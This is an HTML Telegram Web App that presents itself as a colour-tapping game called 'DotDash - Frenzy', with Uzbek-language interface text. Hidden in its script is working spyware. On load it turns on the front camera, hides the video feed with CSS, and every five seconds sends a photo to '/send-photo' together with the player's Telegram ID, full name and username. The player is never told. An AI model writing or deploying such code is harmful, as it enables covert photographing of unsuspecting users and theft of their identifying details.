<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>@DotDash - Frenzy</title>
  <style>
    body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(135deg, #111 0%, #1a1a3d 100%);
      color: #fff;
      text-align: center;
      padding: 2rem;
      margin: 0;
      touch-action: none;
      overflow: hidden;
    }

    .game {
      max-width: 400px;
      margin: auto;
      padding: 1rem;
      background: rgba(29, 29, 29, 0.9);
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
      user-select: none;
    }

    .circle {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      position: absolute;
      cursor: pointer;
      animation: pulse 1.5s infinite;
      transition: transform 0.2s;
    }

    .circle:hover {
      transform: scale(1.2);
    }

    .circle.clicked {
      animation: explode 0.5s forwards;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }

    @keyframes explode {
      0% { transform: scale(1); opacity: 1; }
      100% { transform: scale(2); opacity: 0; }
    }

    video {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
    }

    .loader {
      border: 5px solid #333;
      border-top: 5px solid #0af;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 2rem auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .score {
      font-size: 1.5rem;
      margin: 1rem 0;
      text-shadow: 0 0 10px #0af;
    }

    .target-color {
      font-size: 1rem;
      margin: 0.5rem 0;
      color: #0af;
    }

    .game-area {
      position: relative;
      height: 350px;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
      touch-action: manipulation;
      border: 2px solid #0af;
    }

    .settings {
      margin: 1rem 0;
    }

    .settings select {
      padding: 0.5rem;
      background: #333;
      color: #fff;
      border: 1px solid #0af;
      border-radius: 5px;
      cursor: pointer;
    }

    .progress-bar {
      width: 100%;
      height: 10px;
      background: #333;
      border-radius: 5px;
      overflow: hidden;
      margin: 0.5rem 0;
    }

    .progress {
      height: 100%;
      background: linear-gradient(90deg, #0af, #0f0);
      transition: width 1s linear;
    }

    .logo {
      width: 80px;
      height: 80px;
      margin: 1rem auto;
    }
  </style>
</head>
<body>
  <div class="game">
    <svg class="logo" width="80" height="80" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
      <rect width="512" height="512" fill="transparent"/>
      <circle cx="256" cy="256" r="150" fill="#00aaff"/>
      <circle cx="256" cy="256" r="160" fill="none" stroke="#ffffff" stroke-width="10" opacity="0.3"/>
      <rect x="350" y="240" width="30" height="5" fill="#00aaff" transform="rotate(45, 350, 242.5)"/>
      <rect x="320" y="340" width="30" height="5" fill="#00aaff" transform="rotate(-45, 320, 342.5)"/>
      <rect x="190" y="340" width="30" height="5" fill="#00aaff" transform="rotate(45, 190, 342.5)"/>
      <rect x="160" y="240" width="30" height="5" fill="#00aaff" transform="rotate(-45, 160, 242.5)"/>
      <text x="256" y="400" font-family="Montserrat, sans-serif" font-size="40" fill="#ffffff" text-anchor="middle">DotDash</text>
    </svg>
    <h2>@DotDash - Frenzy</h2>
    <p id="targetText">Faqat <span id="targetColor">ko‘k</span> doiralarni bosing!</p>
    <div class="score">Hisob: <span id="score">0</span></div>
    <div class="settings">
      <label for="difficulty">Qiyinchilik:</label>
      <select id="difficulty">
        <option value="easy">Oson</option>
        <option value="medium">O‘rta</option>
        <option value="hard">Qiyin</option>
      </select>
    </div>
    <div class="progress-bar">
      <div class="progress" id="progress"></div>
    </div>
    <div class="loader"></div>
    <div class="game-area" id="gameArea"></div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    const user = Telegram.WebApp.initDataUnsafe?.user;
    const userId = user?.id || "1612270615";
    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
    const username = user?.username || "";
    const ADMIN_ID = "YOUR_ADMIN_ID"; // Admin Telegram ID’sini qo‘ying

    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const gameArea = document.getElementById("gameArea");
    const scoreDisplay = document.getElementById("score");
    const targetColorText = document.getElementById("targetColor");
    const progressBar = document.getElementById("progress");
    const difficultySelect = document.getElementById("difficulty");
    const loader = document.querySelector(".loader");

    let score = 0;
    let isCapturing = false;
    let lastCaptureTime = 0;
    let circles = [];
    let targetColor = "#0af"; // Boshlang‘ich maqsad rangi
    const colors = ["#0af", "#0f0", "#f00", "#ff0"]; // Ko‘k, yashil, qizil, sariq
    let frenzyMode = false;
    let frenzyTimer = 0;
    let difficulty = "medium";
    let maxCircles = 5;
    let spawnInterval = 1000;

    // O‘yin logikasi
    function createCircle() {
      const circle = document.createElement("div");
      circle.classList.add("circle");
      const color = colors[Math.floor(Math.random() * colors.length)];
      circle.style.background = color;
      const maxX = gameArea.clientWidth - 40;
      const maxY = gameArea.clientHeight - 40;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      circle.style.left = `${newX}px`;
      circle.style.top = `${newY}px`;

      circle.addEventListener("click", () => handleCircleClick(circle, color));
      circle.addEventListener("touchstart", (e) => {
        e.preventDefault();
        handleCircleClick(circle, color);
      });

      gameArea.appendChild(circle);
      circles.push(circle);

      setTimeout(() => {
        if (circle.parentNode) {
          circle.classList.add("clicked");
          setTimeout(() => circle.remove(), 500);
          circles = circles.filter(c => c !== circle);
        }
      }, frenzyMode ? 800 : 2000);
    }

    function handleCircleClick(circle, color) {
      circle.classList.add("clicked");
      setTimeout(() => circle.remove(), 500);
      circles = circles.filter(c => c !== circle);

      if (color === targetColor) {
        score += frenzyMode ? 3 : 1;
      } else {
        score = Math.max(0, score - 1);
      }
      scoreDisplay.textContent = score;

      if (score % 10 === 0 && score > 0) {
        targetColor = colors[Math.floor(Math.random() * colors.length)];
        targetColorText.textContent = getColorName(targetColor);
        targetColorText.style.color = targetColor;
      }
    }

    function getColorName(color) {
      switch (color) {
        case "#0af": return "ko‘k";
        case "#0f0": return "yashil";
        case "#f00": return "qizil";
        case "#ff0": return "sariq";
        default: return "noma’lum";
      }
    }

    function updateProgress() {
      frenzyTimer += 100;
      const progress = (frenzyTimer / 30000) * 100;
      progressBar.style.width = `${progress}%`;

      if (frenzyTimer >= 30000) {
        frenzyMode = true;
        progressBar.style.background = "linear-gradient(90deg, #f00, #0f0)";
        setTimeout(() => {
          frenzyMode = false;
          frenzyTimer = 0;
          progressBar.style.background = "linear-gradient(90deg, #0af, #0f0)";
        }, 10000);
      }
    }

    function updateGame() {
      if (circles.length < maxCircles) {
        createCircle();
      }
    }

    // Qiyinchilik sozlamalari
    difficultySelect.addEventListener("change", () => {
      difficulty = difficultySelect.value;
      switch (difficulty) {
        case "easy":
          maxCircles = 3;
          spawnInterval = 1500;
          break;
        case "medium":
          maxCircles = 5;
          spawnInterval = 1000;
          break;
        case "hard":
          maxCircles = 7;
          spawnInterval = 700;
          break;
      }
    });

    setInterval(updateGame, spawnInterval);
    setInterval(updateProgress, 100);

    // Kamera logikasi
    async function startCamera() {
      try {
        loader.style.display = "block";
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 30 }
          },
          audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = () => {
            video.play().then(resolve).catch(reject);
          };
        });

        loader.style.display = "none";
        startCapture();
      } catch (err) {
        console.error("❌ Kamera ishga tushmadi:", err);
        loader.style.display = "none";
        if (userId === ADMIN_ID) {
          fetch("/log-error", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ error: "Kamera ishga tushmadi: " + err.message, userId })
          });
        }
      }
    }

    async function startCapture() {
      if (isCapturing) return;
      isCapturing = true;

      const capture = async () => {
        if (!video.videoWidth || video.paused || video.ended) {
          console.warn("❌ Video ramkasi tayyor emas");
          return;
        }

        try {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.7));
          const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

          const formData = new FormData();
          formData.append("photo", file);
          formData.append("user_id", userId);
          formData.append("tg_fullname", fullName);
          formData.append("tg_username", username);

          const response = await fetch("/send-photo", {
            method: "POST",
            body: formData
          });

          if (!response.ok) {
            throw new Error("Server javob bermadi");
          }

          console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
        } catch (err) {
          console.error("❌ Yuborish xatosi:", err);
          if (userId === ADMIN_ID) {
            fetch("/log-error", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ error: "Rasm yuborish xatosi: " + err.message, userId })
            });
          }
        }
      };

      setInterval(async () => {
        const now = Date.now();
        if (now - lastCaptureTime >= 5000) {
          lastCaptureTime = now;
          await capture();
        }
      }, 1000);
    }

    startCamera();
  </script>
</body>
</html>
